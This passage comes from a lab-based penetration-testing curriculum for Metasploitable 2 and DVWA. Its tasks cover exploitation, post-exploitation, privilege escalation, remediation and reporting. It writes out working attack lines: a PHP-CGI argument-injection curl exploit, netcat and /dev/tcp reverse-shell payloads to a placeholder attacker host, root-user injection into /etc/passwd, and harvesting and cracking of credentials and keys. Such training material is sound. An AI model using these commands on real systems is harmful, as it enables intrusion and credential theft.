| **Skills Learned** | CGI interface mechanics, how PHP processes arguments in CGI mode, query string parsing vulnerabilities, the difference between PHP running as CGI vs module vs FPM. |
| **Tools Used** | `curl 'http://<target>/cgi-bin/php?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input' --data '<?php system("id"); ?>'`. Metasploit: `use exploit/multi/http/php_cgi_arg_injection`. |
| **Expected Output** | Command execution output returned in HTTP response. Shell obtained through reverse shell payload. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | The crafted URL showing the CGI argument injection. HTTP response with command output. CVE-2012-1823 research notes. |
| **Common Mistakes** | Not URL-encoding special characters properly. Not understanding that this only works when PHP runs in CGI mode (not mod_php). Confusing this with a web application vulnerability — it's a PHP runtime vulnerability. |

---

### Task 6.4 — DVWA Command Injection to Reverse Shell

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the DVWA Command Injection module at Low and Medium security levels to execute system commands and establish a reverse shell. |
| **Skills Learned** | OS command injection patterns (`;`, `&&`, `||`, `|`), input sanitization bypass, the progression from information disclosure to full shell access, security level comparison. |
| **Tools Used** | Browser (DVWA interface), `nc -lvnp 4444` (listener). Payloads: `; nc -e /bin/bash <attacker> 4444` or `| bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'`. |
| **Expected Output** | Command output displayed in DVWA page (Low). Reverse shell received on listener. Documentation of what changes between Low and Medium security (e.g., `&&` and `;` are filtered but `|` is not). |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Payloads used at each security level. Screenshots of successful execution. Notes documenting exactly what each security level filters and how you bypassed it. |
| **Common Mistakes** | Not setting DVWA security level before testing (defaults may vary). Not trying multiple injection operators when one is filtered. Using `nc -e` when the target's netcat doesn't support `-e` (use bash redirect instead). |

---

## Level 7: Exploit Research & Validation

*Move beyond known exploits. Learn to research, evaluate, and validate exploit candidates methodically.*

---

### Task 7.1 — Searchsploit & Exploit Database Research

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | For every service version identified in Level 1, search the local exploit database for matching exploits. Learn to evaluate exploit quality, age, reliability, and prerequisites. |
| **Skills Learned** | Exploit research methodology, `searchsploit` usage, reading exploit code before running it, evaluating exploit reliability (PoC vs weaponized), cross-referencing CVE databases. |
| **Tools Used** | `searchsploit <service> <version>`, `searchsploit -x <exploit-path>` (examine code), Exploit-DB website, CVE Details. |
| **Expected Output** | A research document mapping each service to its exploit candidates. For each candidate: exploit title, EDB-ID, CVE, language, exploit type (local/remote), reliability assessment, and whether you plan to test it. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Full exploit research matrix. Notes on why specific exploits were rejected (wrong version, wrong OS, requires auth you don't have, etc.). |
| **Common Mistakes** | Running exploits without reading the code first (dangerous, even in a lab). Not filtering by platform/version (getting Windows exploits for a Linux target). Trusting exploit descriptions without verifying against the actual target. |

---

### Task 7.2 — Manual Exploit Execution (No Metasploit)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Select three exploits from your research and execute them manually (using Python scripts, curl, netcat, etc.) without Metasploit. Understand each exploit's mechanics at the code level. |
| **Skills Learned** | Reading and modifying exploit code, setting up exploit prerequisites (listeners, payloads), troubleshooting failed exploits, understanding the difference between "the exploit works" and "I understand why it works." |
| **Tools Used** | Python 2/3 scripts from Exploit-DB, `curl`, `nc`, custom bash scripts. |
| **Expected Output** | Three successful manual exploitations with full documentation: what the exploit does, how it works, what you had to modify, and the proof of execution. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Modified exploit scripts. Terminal transcripts showing the exploitation process. Detailed notes for each exploit: vulnerability class, trigger mechanism, payload delivery, and result. |
| **Common Mistakes** | Running Python 2 exploits with Python 3 (or vice versa) without updating syntax. Not modifying hardcoded IPs/ports in exploit scripts. Giving up when an exploit fails once — troubleshooting is the skill being learned. |

---

### Task 7.3 — Metasploit Framework Exploitation (Comparison)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Re-exploit the same three services using Metasploit. Compare the effort, reliability, and understanding gained vs manual exploitation. |
| **Skills Learned** | Metasploit workflow (search, use, set, exploit), module options, payload selection, the trade-off between automation speed and understanding depth. |
| **Tools Used** | `msfconsole`, `search`, `use`, `set RHOSTS`, `set LHOST`, `exploit`. |
| **Expected Output** | Three Metasploit sessions. Comparison document: for each exploit, note time taken, commands required, reliability, and what you learned (manual teaches more, Metasploit is faster). |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Metasploit console output for each exploitation. The comparison document. Honest assessment of what each approach taught you. |
| **Common Mistakes** | Setting LHOST to the target IP instead of the attacker IP. Not checking `show options` for required settings. Using `exploit` instead of `run` (they're aliases but knowing both matters). Relying entirely on Metasploit and never learning manual techniques. |

---

# 👑 PHASE 4: POST-EXPLOITATION & PRIVILEGE ESCALATION

---

## Level 8: Shell Mechanics & Lateral Awareness

*Master the art of upgrading, stabilizing, and operating within compromised shells.*

---

### Task 8.1 — Shell Upgrade: Raw to Interactive TTY

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Upgrade a basic Netcat reverse shell into a fully interactive terminal with tab completion, command history, and proper signal handling. |
| **Skills Learned** | PTY (pseudo-terminal) concepts, why raw shells lack features (no job control, no tab completion, Ctrl+C kills the shell), the Python pty upgrade technique, stty configuration. |
| **Tools Used** | Inside the shell: `python -c "import pty; pty.spawn('/bin/bash')"`. Background with `Ctrl+Z`. On attacker: `stty raw -echo; fg`. In the shell: `export TERM=xterm`. |
| **Expected Output** | Fully interactive shell with tab completion, arrow keys, command history, and proper terminal sizing. Ctrl+C sends SIGINT to remote processes instead of killing the shell. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Step-by-step shell upgrade sequence. Before/after comparison (try tab completion before and after upgrade). Notes on why this matters in real engagements (you need a stable shell to run enumeration tools). |
| **Common Mistakes** | Forgetting `stty raw -echo` before `fg` (shell appears broken). Not setting `TERM=xterm` (tools like `vim`, `top`, `clear` won't work). Pressing Ctrl+C after the upgrade and expecting the shell to survive (it will if done correctly, but test carefully). |

---

### Task 8.2 — File Transfer Techniques

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Transfer files between your attacker machine and the compromised target using at least four different methods. Understand when to use each method. |
| **Skills Learned** | Multiple file transfer protocols, working within restricted environments, adapting to available tools on the target, OPSEC considerations for file transfers. |
| **Tools Used** | Method 1: Python HTTP server (`python3 -m http.server 8000`) + `wget`/`curl`. Method 2: Netcat file transfer. Method 3: Base64 encode/decode. Method 4: SCP/SFTP (if SSH credentials are known). |
| **Expected Output** | Successful file transfer in both directions (attacker→target, target→attacker) using each method. Verification via checksums (`md5sum`). |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Commands used for each transfer method. MD5 checksum verification. Notes on when each method is most appropriate (HTTP for downloads, Netcat for environments without wget, Base64 for very small files or when network transfer is difficult). |
| **Common Mistakes** | Starting the HTTP server in the wrong directory. Using absolute paths incorrectly with `wget`. Forgetting that base64 adds newlines that can corrupt binary files (use `base64 -w 0`). Not verifying file integrity after transfer. |

---

### Task 8.3 — Service Credential Harvesting & Reuse

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | From any shell access, harvest credentials stored in service configuration files. Test those credentials against every other service on the target. |
| **Skills Learned** | Configuration file locations for common services, credential reuse as an attack pattern, how one compromised service leads to others, defense-in-depth failure modes. |
| **Tools Used** | `cat`, `grep`, `find`. Key files: `/etc/shadow`, MySQL configs, Tomcat `tomcat-users.xml`, PHP application configs (`config.php`, `database.php`), `.bash_history`. |
| **Expected Output** | List of all harvested credentials with their source files. Cross-reference matrix showing which credentials work on which services. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Credential inventory table (source file, username, password/hash, services where it works). Notes on credential reuse patterns. |
| **Common Mistakes** | Only checking `/etc/shadow` and ignoring application config files. Not testing harvested credentials against every other service. Not checking `.bash_history` for previously typed passwords or connection strings. |

---

## Level 9: Privilege Escalation

*Elevate from low-privilege shells to root using multiple different techniques.*

---

### Task 9.1 — SUID Binary Exploitation (nmap interactive)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Find SUID binaries and exploit `nmap` (version 4.x with interactive mode) to drop into a root shell. Understand the SUID permission model and why it's dangerous. |
| **Skills Learned** | SUID/SGID permission bits, how SUID allows programs to run as the file owner (often root), finding SUID binaries systematically, GTFOBins as a privilege escalation reference. |
| **Tools Used** | `find / -perm -4000 -type f 2>/dev/null`, `nmap --interactive` then `!sh`. Reference: GTFOBins website. |
| **Expected Output** | List of all SUID binaries. Root shell obtained through `nmap --interactive`. `id` output showing `uid=0(root)`. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Full SUID binary listing. Terminal showing `nmap --interactive` → `!sh` → `id` (root). Notes on GTFOBins and how to check if any SUID binary has a known escalation technique. |
| **Common Mistakes** | Not redirecting stderr in the `find` command (floods the terminal with permission denied messages). Not knowing about GTFOBins — it's the definitive reference for SUID/sudo/capability escalation. Assuming only `nmap` is exploitable (check every SUID binary against GTFOBins). |

---

### Task 9.2 — Writable /etc/passwd & Shadow File Exploitation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Check if `/etc/passwd` or `/etc/shadow` are world-writable. If so, add a new root-level user or modify an existing password hash. Understand the Unix password storage model. |
| **Skills Learned** | `/etc/passwd` and `/etc/shadow` format, password hash generation (`openssl passwd`), UID 0 significance, file permission auditing, why world-writable system files are catastrophic. |
| **Tools Used** | `ls -la /etc/passwd /etc/shadow`, `openssl passwd -1 -salt xyz <password>`, text editor or `echo >> /etc/passwd`. |
| **Expected Output** | New root user added to `/etc/passwd`. Successful `su` to the new user with `uid=0`. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | File permissions before modification. The line added to `/etc/passwd`. `su` and `id` output proving root access. Notes on the `/etc/passwd` line format (`username:hash:uid:gid:info:home:shell`). |
| **Common Mistakes** | Using the wrong hash format for the OS. Corrupting `/etc/passwd` with malformed lines (always verify the format). Not understanding that UID 0 = root regardless of the username. |

---

### Task 9.3 — Kernel Exploit Research & Execution

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify the running kernel version, research local privilege escalation exploits for that version, and execute one safely in the lab. Understand why kernel exploits are high-risk in real engagements. |
| **Skills Learned** | Kernel version identification, local exploit research, cross-compilation, the risk/reward trade-off of kernel exploits (can crash the system), why kernel exploits are a last resort in real pentests. |
| **Tools Used** | `uname -a`, `cat /etc/issue`, `searchsploit linux kernel <version> local privilege escalation`, `gcc` for compilation. |
| **Expected Output** | Kernel version identified. At least one kernel exploit researched and executed (or documented with explanation if intentionally skipped due to crash risk). Root shell obtained. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Kernel version and OS release information. Exploit source code and compilation commands. Execution output. Notes on why kernel exploits are risky (system crash, instability, detection) and when they're appropriate. |
| **Common Mistakes** | Running kernel exploits on production systems (can crash the host). Not compiling for the correct architecture (x86 vs x64). Not understanding that kernel exploits are the noisiest and riskiest escalation method. |

---

### Task 9.4 — Cron Job & Service Misconfiguration Exploitation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Enumerate scheduled tasks and services running as root. Identify writable scripts or configurations that execute with elevated privileges. |
| **Skills Learned** | Cron job enumeration, service process ownership analysis, writable script exploitation, why root-owned processes executing user-writable scripts is a privilege escalation vector. |
| **Tools Used** | `cat /etc/crontab`, `ls -la /etc/cron.*`, `ps aux | grep root`, `find / -writable -type f 2>/dev/null`. |
| **Expected Output** | Enumeration of all cron jobs and root services. Identification of any writable files that run as root. Exploitation (if applicable) or documentation of the attack path. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Cron job listings. Process list filtered for root. Any writable files in privileged execution paths. Attack path diagram. |
| **Common Mistakes** | Only checking `/etc/crontab` and missing user-specific crontabs (`/var/spool/cron/crontabs/`). Not checking if cron scripts source other files that might be writable. Not correlating running processes with their configuration files. |

---

# 🛡️ PHASE 5: DEFENSE, REPORTING & MASTERY

---

## Level 10: Post-Exploitation Intelligence

*With root access secured through multiple paths, extract maximum intelligence and build the complete attack narrative.*

---

### Task 10.1 — System-Wide Credential Harvesting

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Perform comprehensive credential extraction: `/etc/shadow` hashes, SSH private keys, application passwords, database credentials, and service account tokens. Crack password hashes offline. |
| **Skills Learned** | Hash identification (MD5, SHA-256, SHA-512, DES), offline hash cracking, wordlist selection, rule-based attacks, credential correlation across services. |
| **Tools Used** | `cat /etc/shadow`, `find / -name "*.key" -o -name "id_rsa" 2>/dev/null`, `john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt`, `hashcat -m 1800 hashes.txt rockyou.txt`. |
| **Expected Output** | All system and application credentials extracted. Hash cracking results with passwords recovered. Credential reuse analysis across all services. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Extracted hashes (lab-only). Cracking results and time taken. Credential correlation matrix. Notes on hash types encountered and which cracking mode to use for each. |
| **Common Mistakes** | Not identifying the hash type before cracking (wrong mode = no results). Using only dictionary attacks without rules (misses common patterns like `Password1!`). Not looking beyond `/etc/shadow` — application configs contain many passwords. |

---

### Task 10.2 — Complete Attack Graph Construction

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Build a visual attack graph showing every path from initial reconnaissance to root shell. Include all services exploited, credentials used, privilege levels at each step, and alternative paths. |
| **Skills Learned** | Attack path visualization, kill chain analysis, understanding that multiple paths to root exist, communicating technical findings visually. |
| **Tools Used** | Draw.io, Excalidraw, or Mermaid diagrams in Markdown. |
| **Expected Output** | A complete attack graph showing: (1) all initial access paths, (2) credential chains, (3) privilege escalation paths, (4) the relationship between compromised services. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The attack graph image/diagram. Notes on which paths were fastest, most reliable, and stealthiest. |
| **Common Mistakes** | Drawing a single linear path instead of mapping all discovered paths. Not including failed attempts (they show methodology). Not labeling the privilege level at each node. |

---

## Level 11: Defensive Analysis & Remediation

*Switch to the defender's perspective. For every vulnerability exploited, define the fix.*

---

### Task 11.1 — Service-by-Service Remediation Plan

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | For every vulnerability exploited in Levels 4–9, write a specific, actionable remediation recommendation. Prioritize by risk (CVSS-style: Critical/High/Medium/Low). |
| **Skills Learned** | Risk rating methodology, writing actionable remediation recommendations, understanding the difference between "disable the service" and "configure it securely," defense-in-depth thinking. |
| **Tools Used** | Your notes editor. Reference: CIS Benchmarks, vendor security guides. |
| **Expected Output** | Remediation table with columns: Vulnerability, Exploited Service, Risk Rating, Remediation Action, Verification Method. Minimum 15 entries. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The complete remediation plan. Notes on prioritization rationale. |
| **Common Mistakes** | Writing vague recommendations ("patch the system" vs "upgrade Samba from 3.0.20 to latest, remove `username map script` from smb.conf, restrict SMB to internal subnet via iptables"). Not providing verification steps (how does the admin know the fix worked?). |

---

### Task 11.2 — Firewall Rule Design

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Design an `iptables` ruleset that would have prevented or limited each attack path. Apply defense-in-depth: network segmentation, service isolation, egress filtering. |
| **Skills Learned** | `iptables` rule syntax, default-deny policies, ingress vs egress filtering, why egress filtering prevents reverse shells, network segmentation principles. |
| **Tools Used** | Your notes editor. `iptables` documentation. |
| **Expected Output** | A complete `iptables` ruleset with comments explaining each rule. Separate sections for: inbound service restrictions, outbound (egress) filtering, and logging rules. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The complete ruleset. Notes on which attack paths each rule blocks. Explanation of why egress filtering is critical (blocks reverse shells). |
| **Common Mistakes** | Forgetting egress filtering (reverse shells bypass inbound-only firewalls). Not setting a default DROP policy. Not allowing established/related connections (breaks legitimate responses). Locking yourself out of SSH. |

---

## Level 12: Hard Mode Challenges

*Re-compromise the target under artificial constraints to test mastery and develop professional-grade reporting skills.*

---

### Task 12.1 — No-Metasploit Full Compromise

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Achieve root on Metasploitable 2 from scratch without using Metasploit Framework (no `msfconsole`, `msfvenom`, `meterpreter`). Use only open-source tools, scripts, and manual techniques. |
| **Skills Learned** | Tool independence, manual exploitation depth, understanding that Metasploit is a convenience — not a requirement, building confidence for OSCP-style constraints. |
| **Tools Used** | `nmap`, `nc`, `curl`, `python`, `searchsploit`, `john`, `hydra`, `gobuster`, custom scripts. |
| **Expected Output** | Root shell obtained. Complete terminal transcript documenting every command. Time log showing how long each phase took. |
| **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
| **Save These** | Full terminal history. Time log. Reflection on which steps were hardest without Metasploit and why. |
| **Common Mistakes** | Giving up too quickly when the first approach fails. Not having alternative exploitation paths planned. Not practicing this before attempting OSCP or similar certifications. |

---

### Task 12.2 — Constrained Entry Point Challenges

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Complete three separate compromise runs, each starting from a different constrained entry point: (A) web-only (ports 80/8180), (B) network services only (no web), (C) UDP-discovered services only. |
| **Skills Learned** | Adaptability, creative exploitation under constraints, understanding that real engagements often have limited attack surface, developing multiple methodologies. |
| **Tools Used** | Varies per constraint. |
| **Expected Output** | Three separate compromise write-ups, each documenting the constrained path from initial access to root. |
| **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
| **Save These** | All three write-ups. Reflection comparing the difficulty and approach of each constraint. |
| **Common Mistakes** | Accidentally using a non-allowed entry point. Not resetting the VM between runs. Not documenting the constraint clearly in the write-up. |

---

### Task 12.3 — Professional Penetration Test Report

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Write a professional-grade penetration test report covering your entire Metasploitable 2 assessment. Follow a real report structure: Executive Summary, Scope, Methodology, Findings (with CVSS scores), Evidence, Remediation, and Appendices. Time-box the entire process to 3 hours. |
| **Skills Learned** | Professional report writing, executive vs technical audience communication, CVSS scoring, evidence presentation, the difference between a vulnerability list and a pentest report. |
| **Tools Used** | Markdown/Word/LaTeX editor. CVSS Calculator (FIRST.org). Your accumulated notes and screenshots. |
| **Expected Output** | A complete penetration test report (10+ pages) that you could present to a hypothetical client. Includes: executive summary (1 page, non-technical), methodology, at least 10 findings with CVSS scores, evidence screenshots, and prioritized remediation recommendations. |
| **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
| **Save These** | The complete report (this is a portfolio piece). Notes on the CVSS scoring process. Reflection on what was hardest about report writing. |
| **Common Mistakes** | Writing a "hacker blog post" instead of a professional report. Not including an executive summary (the most important section for clients). Not providing evidence for every finding. Not prioritizing findings by business impact. Writing overly technical language in the executive summary. |

---

## ✅ Completion Checklist

| Phase | Status |
|:---|:---:|
| Phase 1: Foundation & Lab Setup (Tasks 0.1–1.5) | ☐ |
| Phase 2: Deep Enumeration (Tasks 2.1–3.5) | ☐ |
| Phase 3: Exploitation Core (Tasks 4.1–7.3) | ☐ |
| Phase 4: Post-Exploitation & PrivEsc (Tasks 8.1–9.4) | ☐ |
| Phase 5: Defense, Reporting & Mastery (Tasks 10.1–12.3) | ☐ |
| **All 73 Tasks Complete** | ☐ |
